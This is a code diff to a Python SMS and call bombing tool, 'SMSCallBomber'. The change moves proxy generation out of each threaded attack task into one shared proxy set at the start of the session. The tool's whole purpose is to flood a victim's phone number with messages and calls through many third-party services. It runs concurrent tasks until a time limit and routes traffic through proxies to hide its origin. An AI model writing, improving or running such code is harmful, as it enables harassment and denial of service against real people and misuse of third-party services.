@@ -42,6 +42,7 @@ class SMSCallBomber(threading.Thread):
             )
         else:
             logging.basicConfig(handlers=[logging.NullHandler()])
+        self.proxy = None
         self.services = get_services(self.country_code, self.args.phone)
         self.successful_count = 0
         self.failed_count = 0
@@ -52,6 +53,7 @@ class SMSCallBomber(threading.Thread):
 
     async def _run(self):
         async with ClientSession(timeout=ClientTimeout(total=self.args.timeout)) as session:
+            self.proxy = self.args.proxy if self.args.proxy is not True else await self.generate_proxy(session)
             tasks = []
             for _ in range(self.args.threads):
                 task = asyncio.create_task(self.attack(session))
@@ -62,10 +64,9 @@ class SMSCallBomber(threading.Thread):
     async def attack(self, session):
         local_successful_count = 0
         local_failed_count = 0
-        proxy = self.args.proxy if self.args.proxy is not True else await self.generate_proxy(session)
         while self.running and time.time() < self.args.time and self.services:
             service_info = random.choice(self.services)
-            service = Service(service_info, self.args.phone, self.args.timeout, proxy)
+            service = Service(service_info, self.args.phone, self.args.timeout, self.proxy)
             domain_name = service.get_domain_name()
             try:
                 status_code = await service.send_request(session)
